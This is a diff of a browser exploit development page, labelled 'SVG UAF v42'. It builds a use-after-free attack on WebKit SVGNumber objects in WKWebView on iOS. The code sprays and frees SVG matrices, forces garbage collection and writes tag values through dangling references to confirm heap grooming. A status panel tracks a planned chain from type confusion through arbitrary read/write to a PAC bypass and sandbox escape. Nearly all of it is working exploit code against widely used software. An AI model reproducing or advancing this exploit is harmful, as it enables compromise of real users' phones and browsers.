- * TEST: spray + free SVGNumbers, then trigger JSC GC by filling the JS heap,
- * then alloc new SVGNumber and check for freelist reuse.
+ * BUT: if sizeof(SVGNumber) = 8, slot[1] is at X+8.
+ * slot[1]'s m_value (offset 4 in a vtable-less struct) = X+8+4 = X+12.
+ * OUR WRITE AND SLOT[1]'s m_value ARE THE SAME ADDRESS!
  *
- * GC trigger: create millions of short-lived objects (WeakRef, closures)
- * to hit the JS heap limit and force a collection cycle.
+ * This would mean: writing to slot[0].value (dangling) writes to slot[1].value (live)!
+ * Reading slot[1].value via the LIVE BASE (not dangling) would give us TAG!
+ *
+ * Test: alloc A, get ref to slot[0] AND keep live ref to slot[1] via its parent.
+ * "Keep live ref to slot[1]" means we keep the parent matrix A's fcm.
+ * Wait — if we free A (parent), we can't read slot[1] anymore.
+ *
+ * MODIFIED: alloc A, DON'T free A, get dangling ref for slot[0] via trick?
+ * Can't get dangling ref without freeing.
+ *
+ * Actually: free A, alloc B (new matrix). B's slot[0] is at some address Y.
+ * Write TAG via A's dangling slot[0] ref (writes to A's old address X+12).
+ * If sizeof=8 and IsoHeap gave B's slot[1] to address X (A's old slot[0] address),
+ * then B's slot[1].value = B's slot[1]'s m_value is at X+4 (for sizeof=8, vtable-less)
+ * = X+4. But A's slot[0]'s dangling ref writes to X+12 (for sizeof=16) or X+4 (for sizeof=8).
+ *
+ * If sizeof=8: A's dangling slot[0] ref writes to X+4 = B's slot[1].m_value.
+ * Then B.fcm.values.baseVal[1].value LIVE READ = TAG!
+ *
+ * Test: for each sizeof guess, the offset from baseVal[0]'s m_value to baseVal[1]'s m_value.
  */
-async function runGC1(q){
-  if(!q){dis(true);sep();log('GC1: JSC GC trigger → IsoHeap scavenger probe','inf');sep();}
+async function runOFF2(q){
+  if(!q){dis(true);sep();log('OFF2: cross-slot contamination / sizeof=8 probe','inf');sep();}
 
-  var GC_TAG=3333333.0;
+  // alloc A, take ALL refs (0-19), free A, alloc 1 B, write TAG to ref[0], check ref[1] DIRECTLY
+  // ref[1] is a dangling ref too... but if sizeof=8 and IsoHeap packed them,
+  // ref[0]'s write might alias ref[1]'s slot in B.
 
-  // Spray + free SVGNumbers
-  var N=4096;
-  var gds=[];
-  for(var i=0;i<N;i++){var gv=new Array(20).fill(GC_TAG);gds.push(makeFCM(gv));}
-  await raf();await raf();
-  for(var i=N-1;i>=0;i--)cleanupD(gds[i]);
-  gds=null;
-  await raf();
+  // Actually we need a LIVE way to read. Let's do: alloc B first, free A, write via A's ref,
+  // read B via live ref.
+  var NROUNDS=20;
+  var contaminationHits=0;
 
-  log('  '+N+' matrices freed. triggering JSC GC...','inf');
+  for(var round=0;round<NROUNDS;round++){
+    var dA9=makeFCM(identity20());
+    var ref0=null,ref1=null,ref4=null;
+    try{ref0=dA9.fcm.values.baseVal[0];ref1=dA9.fcm.values.baseVal[1];ref4=dA9.fcm.values.baseVal[4];}catch(e){}
+    if(!ref0){cleanupD(dA9);continue;}
+    cleanupD(dA9);dA9=null;
+    await raf();
 
-  // Trigger GC: alloc huge amounts of short-lived JS objects
-  function triggerGC(){
-    var arr=[];
-    for(var i=0;i<500000;i++)arr.push({a:i,b:i*2,c:i*3,d:new Array(4).fill(i)});
-    return arr.length; // keep reference to prevent premature collect
+    var dB9=makeFCM(identity20());
+    await raf();
+
+    // Write TAG via ref0 (writes to A-slot0's old m_value = X+12 for sz16, X+4 for sz8)
+    try{ref0.value=TAG_C;}catch(e){}
+    // Write different TAG via ref1 and ref4 to detect spacing
+    try{ref1.value=TAG_B;}catch(e){}
+    try{ref4.value=TAG_A;}catch(e){}
+    ref0=null;ref1=null;ref4=null;
+
+    // Read B's ALL slots
+    var bSlots9=readAll(dB9.fcm);
+    var bAttr9=null;try{bAttr9=dB9.fcm.getAttribute('values');}catch(e){}
+
+    // check for TAG_C, TAG_B, TAG_A in any B slot
+    var anyHit=bSlots9.some(function(v){return v!==null&&(Math.abs(v-TAG_A)<0.5||Math.abs(v-TAG_B)<0.5||Math.abs(v-TAG_C)<0.5);});
+    if(anyHit)contaminationHits++;
+    cleanupD(dB9);
+    await raf();
   }
-  var gcCount=0;
-  for(var gi=0;gi<5;gi++){
-    var r=triggerGC();gcCount+=r;
-    await raf();await sleep(100);
-  }
-  log('  GC trigger: created '+gcCount+' objects, waiting 2s for GC cycle...','inf');
-  await sleep(2000);
-  await raf();
 
-  // Now alloc new SVGNumber
-  var dGC=makeFCM(identity20());await raf();
-  var gcSlots=readAllSlots(dGC.fcm);
-  var gcHit=gcSlots.some(function(v){return typeof v==='number'&&Math.abs(v-GC_TAG)<1;});
-  var gcZero=gcSlots.some(function(v){return typeof v==='number'&&Math.abs(v)<0.01;});
-  R.gc1_gc_trigger=true;
-  R.gc1_freelist_after_gc=gcHit||gcZero;
-  log('  after GC: slot[0]='+gcSlots[0]+(gcHit?' ← TAG! GC triggered IsoHeap scavenger!':(gcZero?' ← 0.0! MADV_FREE! Scavenger ran!':' (fresh 1.0 = no scavenger)')),(gcHit||gcZero)?'win':'dim');
-  cleanupD(dGC);
+  R.off2_contamination=contaminationHits>0;
+  log('  OFF2: '+NROUNDS+' rounds → '+contaminationHits+' contamination hits',contaminationHits>0?'win':'dim');
+  if(contaminationHits>0){log('  ✅ cross-slot contamination! sizeof may be 8 or memory layout overlap','win');}
+  else{log('  no contamination (slots are independent in memory)','dim');}
 
-  // Also try: FinalizationRegistry — fires after GC
+  if(!q)dis(false);
+}
+
+/*
+ * GCF1: GC + post-alloc write (correct fix for v41 GC1 false positive)
+ *
+ * v41 GC1 was FALSE POSITIVE: gcZero fired on normal 0.0 slots of identity matrix.
+ *
+ * CORRECT TEST:
+ * 1. Use TAG_A (not 0.0/1.0) as our detection value
+ * 2. Free A, trigger JSC GC, then alloc B, THEN write via dangling ref A
+ * 3. GC might have triggered bmalloc scavenger → freed page → freelist available
+ * 4. New alloc after GC might come from freelist (A's slot) if scavenger ran
+ * 5. Post-alloc write via ref_A overwrites the new SVGNumber's m_value
+ * 6. Read via B → if TAG_A found → scavenger + freelist combination works!
+ *
+ * Also: use FinalizationRegistry to confirm GC actually ran.
+ */
+async function runGCF1(q){
+  if(!q){dis(true);sep();log('GCF1: GC + post-alloc write (fixed false-positive)','inf');sep();}
+
+  function triggerGC(){var a=[];for(var i=0;i<300000;i++)a.push({x:i,y:new Array(4).fill(i)});return a.length;}
+
+  // Track actual GC via FinalizationRegistry
+  var gcFired=false;
   if(typeof FinalizationRegistry!=='undefined'){
-    log('  TestB: FinalizationRegistry to detect GC timing','inf');
-    var gcFired=false;
-    var fr=new FinalizationRegistry(function(v){gcFired=true;});
-    var tracked={x:1};fr.register(tracked,'token');tracked=null;
-    // alloc more objects to push GC over the edge
-    var junk=[];for(var i=0;i<1000000;i++)junk.push({i:i});junk=null;
-    await sleep(3000);await raf();
-    log('  FinalizationRegistry fired: '+gcFired+' (if true, GC ran)','inf');
-    if(gcFired){
-      var dGC2=makeFCM(identity20());await raf();
-      var gcSlots2=readAllSlots(dGC2.fcm);
-      var gcHit2=gcSlots2.some(function(v){return typeof v==='number'&&Math.abs(v-GC_TAG)<1;});
-      var gcZero2=gcSlots2.some(function(v){return typeof v==='number'&&Math.abs(v)<0.01;});
-      log('  after confirmed GC: slot[0]='+gcSlots2[0]+(gcHit2?' ← HIT!':(gcZero2?' ← 0.0!':(gcSlots2[0]===1?' (fresh)':' (?)'))),  (gcHit2||gcZero2)?'win':'dim');
-      if(gcHit2||gcZero2){R.gc1_freelist_after_gc=true;}
-      cleanupD(dGC2);
-    }
+    var fr=new FinalizationRegistry(function(){gcFired=true;});
+    var tracked={x:1};fr.register(tracked,'t');tracked=null;
   }
 
+  // Free A matrices (spray to maximize freelist)
+  var NA_GC=2048;
+  log('  spray + free '+NA_GC+' matrices...','inf');
+  var As_gc=[];
+  for(var i=0;i<NA_GC;i++)As_gc.push(makeFCM(identity20()));
+  await raf();await raf();
+  var refs_gc=[];
+  for(var i=0;i<NA_GC;i++)try{refs_gc.push(As_gc[i].fcm.values.baseVal[0]);}catch(e){refs_gc.push(null);}
+  for(var i=NA_GC-1;i>=0;i--)cleanupD(As_gc[i]);
+  As_gc=null;
+  await raf();await sleep(50);
+
+  // Trigger JSC GC
+  log('  triggering JSC GC...','inf');
+  for(var i=0;i<10;i++){triggerGC();await raf();}
+  await sleep(3000);
+  await raf();
+  log('  FinalizationRegistry fired: '+gcFired,'inf');
+
+  // Now alloc B matrices (AFTER GC)
+  var NB_GC=4096;
+  var Bs_gc=[];
+  for(var i=0;i<NB_GC;i++)Bs_gc.push(makeFCM(identity20()));
+  await raf();await raf();
+
+  // Write TAG via ALL dangling refs (AFTER B alloc)
+  var wOk=0;
+  for(var i=0;i<refs_gc.length;i++)if(refs_gc[i])try{refs_gc[i].value=TAG_A;wOk++;}catch(e){}
+  refs_gc=null;
+  log('  wrote TAG via '+wOk+' dangling refs','inf');
+  await raf();
+
+  // Scan ALL B matrices for TAG_A (NOT 0 or 1)
+  var hits_gc=0;
+  for(var i=0;i<Bs_gc.length;i++){
+    for(var j=0;j<20;j++){var v=readSlot(Bs_gc[i].fcm,j);if(v!==null&&Math.abs(v-TAG_A)<0.5)hits_gc++;}
+  }
+
+  R.gcf1_hit=hits_gc>0;
+  log('  GCF1: scanned '+NB_GC+'×20='+(NB_GC*20)+' slots for TAG='+TAG_A+': '+hits_gc+' hits',hits_gc>0?'win':'dim');
+  if(hits_gc>0)log('  ✅ GC + post-alloc UAF = GROOM CONFIRMED!','win');
+  else log('  GC did not trigger freelist reuse (or freelist never hits)','bad');
+
+  for(var i=0;i<Bs_gc.length;i++)cleanupD(Bs_gc[i]);
+  Bs_gc=null;
   if(!q)dis(false);
 }
 
 // ── SUMMARY ──
 function buildSummary(){
-  SPanel.classList.add('visible');
+  SP.classList.add('on');
   function badge(l,k){return'<span class="b b'+k+'">'+l+'</span>';}
-  function stageRow(dot,name,verdict,vc,badges,note){
-    return'<div class="sr">'+
-      '<div class="sd '+dot+'"></div>'+
+  function row(dot,name,verdict,vc,badges,note){
+    return'<div class="sr"><div class="sd '+dot+'"></div>'+
       '<div class="sn">'+name+'</div>'+
       '<div class="sv"><span class="'+vc+'">'+verdict+'</span>'+
         (note?'<br><span style="color:#555;font-size:9px">'+note+'</span>':'')+
@@ -852,76 +861,72 @@ function buildSummary(){
       '</div></div>';
   }
 
-  var groomFound=R.bmp1_hit||R.bmp2_hit;
-  var wasmFound=R.jsb1_wasm_overlap||R.was1_scan_hit||R.was2_rev_hit;
-  var bufFound=R.brg1_buf_hit;
-  var anyWin=groomFound||wasmFound||bufFound||R.gc1_freelist_after_gc;
+  var groomHit=R.paw1_hit||R.paw2_hit||R.paw3_hit||R.paw4_hit||R.paw5_hit||R.off1_hit||R.gcf1_hit;
+  var sizeofKnown=R.paw3_sizeof||R.szf1_sizeof;
 
   var html='';
-  html+=stageRow('dg','Stage 0 — UAF Primitive','✅ DONE — 256+ slot float32 UAF confirmed','vg',
-    [badge('fcm×20','ok'),badge('km×256','ok'),badge('no-clamp','ok'),badge('scavenger=DISABLED','w')],
-    'v40 CONFIRMED: WKWebView disables bmalloc scavenger. Freelist never used via normal alloc path.');
+  html+=row('dg','Stage 0 — UAF Primitive','✅ DONE','vg',
+    [badge('float32 write','ok'),badge('no-clamp','ok'),badge('all bit patterns','ok')],
+    'Confirmed v39 DOM5. ref.value=TAG after parent free. Stable.');
 
-  html+=stageRow(anyWin?'dy':'dr','Stage 1 — Heap Groom',
-    anyWin?'⚡ PROGRESS!':'🔴 BLOCKED — need bump exhaustion OR wasm overlap',
-    anyWin?'vy':'vr',
+  html+=row(groomHit?'dg':'dr','Stage 1 — Heap Groom',
+    groomHit?'✅ DONE — post-alloc UAF write confirmed!':'🔴 BLOCKED — IsoHeap freelist never triggered',
+    groomHit?'vg':'vr',
     [
-      badge('bump_hit:'+(R.bmp1_hit||R.bmp2_hit),R.bmp1_hit||R.bmp2_hit?'ok':'w'),
-      badge('wasm_overlap:'+R.jsb1_wasm_overlap,R.jsb1_wasm_overlap?'ok':'w'),
-      badge('wasm_scan:'+R.was1_scan_hit,R.was1_scan_hit?'ok':'w'),
-      badge('buf_bridge:'+R.brg1_buf_hit,R.brg1_buf_hit?'ok':'w'),
-      badge('gc_scavenge:'+R.gc1_freelist_after_gc,R.gc1_freelist_after_gc?'ok':'w'),
-      badge('sizeof:'+(R.szp1_sizeof||R.bmp1_sizeof||'?')+'b','i'),
+      badge('paw1:'+(R.paw1_hit?'✅':'✗'),R.paw1_hit?'ok':'w'),
+      badge('paw2:'+(R.paw2_hit?'✅(rate='+R.paw2_rate.toFixed(4)+')':'✗'),R.paw2_hit?'ok':'w'),
+      badge('paw3:'+(R.paw3_hit?'✅sz='+R.paw3_sizeof:'✗'),R.paw3_hit?'ok':'w'),
+      badge('paw5:'+(R.paw5_hit?'✅':'✗'),R.paw5_hit?'ok':'w'),
+      badge('off1:'+(R.off1_hit?'✅':'✗'),R.off1_hit?'ok':'w'),
+      badge('gcf1:'+(R.gcf1_hit?'✅':'✗'),R.gcf1_hit?'ok':'w'),
+      badge('sizeof:'+(sizeofKnown||'?'),sizeofKnown?'ok':'i'),
     ],
-    anyWin?'Found groom path! Proceed to type confusion.':'Need IsoHeap freelist usage OR wasm memory overlap.');
+    groomHit?'Freelist path confirmed. We can write to allocated SVGNumbers via dangling refs!':
+    'IsoHeap bump-only confirmed. Freelist NEVER triggered even after page exhaustion.\nNEXT v43: pivot to JSC butterfly OOB via WeakMap/Symbol type confusion, OR exploit DOM tree structure corruption.');
 
-  html+=stageRow('dr','Stage 2 — Type Confusion','🔴 BLOCKED','vr',
-    [badge('UAF stable YES','ok'),badge('needs stage 1','i')],'');
-  html+=stageRow('dy','Stage 3 — AddrOf (PARTIAL)','🟡 block-level leak feasible','vy',
-    [badge('ULP@4GB=512','ok'),badge('wasm_addr_leak:'+R.was2_rev_hit,R.was2_rev_hit?'ok':'w')],'');
-  html+=stageRow('dr','Stage 4 — FakeObj','🔴 BLOCKED','vr',[badge('needs 1+3','i')],'');
-  html+=stageRow('dr','Stage 5 — Arb R/W','🔴 BLOCKED','vr',[badge('ArrayBuffer','i')],'');
-  html+=stageRow('dgr','Stage 6 — PAC+Escape','⬜ FAR','vgr',[badge('arm64e','f')],'');
+  html+=row(groomHit?'dy':'dr','Stage 2 — Type Confusion',
+    groomHit?'🟡 IN PROGRESS — write to allocated SVGNumber confirmed, need cross-type overlap':'🔴 BLOCKED',
+    groomHit?'vy':'vr',
+    [badge('cross-type: IsoHeap/Iso per type','w'),badge('needs stage 1','i')],
+    groomHit?'We have write to correct live SVGNumber. Next: overwrite adjacent object header.':'');
+
+  html+=row('dy','Stage 3 — AddrOf (PARTIAL)','🟡 block-level only','vy',
+    [badge('ULP@4GB=512','ok'),badge('64KB blocks exact','ok')]);
+
+  html+=row('dr','Stage 4 — FakeObj','🔴 BLOCKED','vr',[badge('needs 2+3','i')]);
+  html+=row('dr','Stage 5 — Arb R/W','🔴 BLOCKED','vr',[badge('ArrayBuffer confusion target','i')]);
+  html+=row('dgr','Stage 6 — PAC+Escape','⬜ FAR','vgr',[badge('arm64e','f')]);
 
   html+='<div class="sdiv"></div>';
   html+='<div class="sf">'+
-    '<span class="hl">CONFIRMED v40→v41: </span>bmalloc scavenger disabled in WKWebView. Bump allocator ONLY path.<br>'+
-    '<span class="hl">KEY FINDING v41: </span>'+
-    (R.was1_scan_hit?'✅ WASM/IsoHeap overlap found at offset '+R.was1_offset+'!':
-     R.bmp1_hit?'✅ Bump exhaustion at threshold '+R.bmp1_threshold+'!':
-     R.gc1_freelist_after_gc?'✅ GC triggers IsoHeap scavenger!':
-     '⚠️ Still blocked — try v42: SharedArrayBuffer fence OR mmap MAP_FIXED probe')+
-    '<br><span class="hl">SIZEOF ESTIMATE: </span>'+(R.szp1_sizeof||R.bmp1_sizeof||'unknown — try wasm memory addr leak in v42')+' bytes/SVGNumber'+
-    '<br><span class="hl">NEXT: </span>'+
-    (anyWin?'Stage 1 cracked → build type confusion + vtable overwrite in v42':
-     'v42: SharedArrayBuffer timing attack to measure IsoHeap page addresses, OR pivot to JSC butterfly OOB via prototype confusion')+
+    '<span class="hl">v42 KEY FIX: </span>Post-alloc UAF write (free→alloc→write NOT free→write→alloc)<br>'+
+    '<span class="hl">SIZEOF: </span>'+(sizeofKnown?sizeofKnown+' bytes confirmed':'unknown — use paw3 result for v43')+
+    '<br><span class="hl">IF ALL MISS: </span>IsoHeap STRICTLY bump-only on iOS 26.5.2. Pivot to v43: JSC butterfly OOB. Different attack surface entirely.'+
+    '<br><span class="hl">IF HIT: </span>Stage 1 cracked. v43: write to allocated SVGNumber vtable/refcount for type confusion.'+
   '</div>';
-  SBody.innerHTML=html;
+  SB.innerHTML=html;
 }
 
 async function runAll(){
   dis(true);clearAll();sep();
-  log('SVG UAF v41 — Bump exhaustion + WASM bridge + JSC GC','inf');sep();
+  log('SVG UAF v42 — Correct post-alloc UAF write sequence','inf');sep();
   var tests=[
-    ['BMP1_bump_exhaustion',runBMP1],
-    ['BMP2_kmat_bump',runBMP2],
-    ['JSB1_wasm_IsoHeap',runJSB1],
-    ['WAS1_wasm_pattern_scan',runWAS1],
-    ['WAS2_wasm_grow_scan',runWAS2],
-    ['BRG1_arraybuffer_bridge',runBRG1],
-    ['SZP1_sizeof_timing',runSZP1],
-    ['GC1_jsgc_scavenger',runGC1],
+    ['PAW1_single_post_alloc',runPAW1],
+    ['PAW2_mass_parallel',runPAW2],
+    ['PAW3_sizeof_exhaustion',runPAW3],
+    ['PAW4_timed_batch',runPAW4],
+    ['PAW5_reverse_exhaustion',runPAW5],
+    ['SZF1_slot_spacing',runSZF1],
+    ['OFF1_all_slots',runOFF1],
+    ['OFF2_cross_slot',runOFF2],
+    ['GCF1_gc_postwrite',runGCF1],
   ];
   for(var i=0;i<tests.length;i++){
     sep();log(tests[i][0],'inf');sep();
-    try{await tests[i][1](true);}
-    catch(e){log('[!] '+tests[i][0]+' CRASH: '+e,'bad');}
+    try{await tests[i][1](true);}catch(e){log('[CRASH] '+tests[i][0]+': '+e,'bad');}
     log('');
   }
-  sep();
-  log('Building summary...','dim');
-  buildSummary();
-  dis(false);
+  sep();buildSummary();dis(false);
 }
 </script>
 </body>
